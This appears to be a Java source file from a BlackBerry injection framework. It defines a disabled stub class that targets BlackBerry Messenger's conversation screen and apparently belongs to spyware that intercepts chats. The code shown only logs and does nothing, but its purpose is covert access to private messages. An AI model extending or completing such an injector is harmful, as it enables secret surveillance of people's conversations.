package blackberry.injection.injectors;

import net.rim.device.api.ui.Screen;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class BBMInjector extends AInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("BBMInjector", DebugLevel.VERBOSE);
    //#endif
    
    public boolean enabled(){
        return false;
    }
    
    public String getAppName() {        
        return "Messenger";
    }

    public String[] getWantedScreen() {
        return new String[]{"ConversationScreen"};
    }

    public void playOnScreen(Screen screen) {
        //#ifdef DEBUG
        debug.trace("playOnScreen: " + screen);
        //#endif
    }

    public String getCodName() {
        return "net_rim_bb_qm_peer";
    }

}
